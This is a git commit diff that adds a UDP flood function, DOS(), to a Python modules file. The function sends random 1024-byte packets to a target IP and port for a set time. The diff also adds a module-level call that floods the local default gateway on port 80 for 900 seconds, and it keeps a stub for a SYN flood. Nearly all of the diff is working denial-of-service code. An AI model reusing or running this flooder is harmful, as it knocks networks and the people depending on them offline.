a207182efbe700ce7a756f8abc72f81166308b55
Adamkadaban <34610663+Adamkadaban@users.noreply.github.com>
2019-03-22 23:27:49 -0400

    Update modules.py

--- modules.py
+++ modules.py
@@ -1,4 +1,35 @@
-import os, sys, netifaces, random, scapy.all
+import os
+import sys
+import netifaces
+import random
+import platform
+import sys
+import socket
+import time
+
+
+def DOS(IP, port, times):
+    if platform.system()[:3].lower()=="win":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1024)
+    timeoutValue = time.time() + times
+
+    c = 0  # num of packets
+
+    while True:
+        try:
+            if time.time() > timeoutValue:
+                break
+            sock.sendto(bytes, (IP, port))
+            c += 1
+            print("sent " + str(c) + " packets to " + IP + " through port " + str(port))
+        except KeyboardInterrupt:
+            quit()
+
 
 def getGateway():
     default_gateway=netifaces.gateways()
@@ -11,4 +42,9 @@ def pingDataOverload(IP):
 
 def synFlood(IP, port, numPackets): #implement later
 	pass
+
+
+
 # print(getGateway())
+# pingDataOverload(getGateway())
+DOS(getGateway(), 80, 900)
